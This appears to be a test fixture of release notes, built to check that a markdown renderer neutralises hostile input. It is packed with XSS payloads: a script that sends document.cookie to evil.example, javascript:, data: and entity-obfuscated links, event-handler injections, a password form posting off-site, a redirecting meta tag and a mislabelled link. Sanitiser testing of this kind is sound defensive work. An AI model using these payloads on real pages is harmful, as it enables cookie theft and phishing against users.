# <script>alert('heading')</script> A release that misbehaves <img src=x onerror=alert(1)>

<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>

<iframe src="https://evil.example/"></iframe> <style>* { display: none }</style> <base href="https://evil.example/">

None of the next links may work: [update now](javascript:alert(document.domain)), [upper case](JAVASCRIPT:alert(1)), [data](data:text/html,<script>alert(1)</script>), [vbscript](vbscript:msgbox(1)), [a local file](file:///C:/Windows/System32/calc.exe), [relative](/HydrosPlays/Pelagix), [no scheme](//evil.example/x), [plain http](http://plain.example/), [custom protocol](ms-settings:windowsupdate).

Nor these, which hide the scheme: [tab entity](java&Tab;script:alert(1)), [hex entity](&#x6A;avascript:alert(1)), [colon entity](javascript&colon;alert(1)), [angle brackets](<javascript:alert(1)>), [credentials](https://github.com@evil.example/login), <javascript:alert(1)>, <data:text/html,x>.

This one works, but its label lies about where it goes: [https://github.com/HydrosPlays/Pelagix](https://example.com/not-github). Hover it to see the real address.

Images never load: ![tracking pixel](https://evil.example/pixel.png?user=1) and ![x" onerror="alert(1)](https://example.com/i.png "t\" onload=\"alert(1)") and ![](https://example.com/unnamed.png).

<a href="javascript:alert(1)" onclick="alert(2)">a raw anchor</a> <form action="https://evil.example/"><input name="password"></form> <svg onload="alert(1)"></svg>

| <script>1</script> | [cell link](javascript:1) | `</td></tr></table><script>` |
| --- | :-: | --: |
| <object data=x> | &lt;b&gt;entity&lt;/b&gt; | a \| b |
| one | two | three | four | five |

```html" onload="alert(1)
</code></pre><script>alert('fence')</script>
```

> <meta http-equiv="refresh" content="0;url=https://evil.example/">
>
> > > > > > > > > > A quote nested ten deep.

> [!CAUTION]
> <button onclick="alert(1)">An alert box with a button that is only text</button>

- [x] <input type="checkbox" onclick="alert(1)"> a task item
- [ ] [![nested image](data:image/svg+xml,<svg onload=alert(1)>)](javascript:alert(1))

[reference]: javascript:alert(1)
[good reference]: https://example.com/reference

A [reference] that goes nowhere and a [good reference] that works.

<!-- a comment that should not show --> Text after a comment. <!-- an unclosed comment
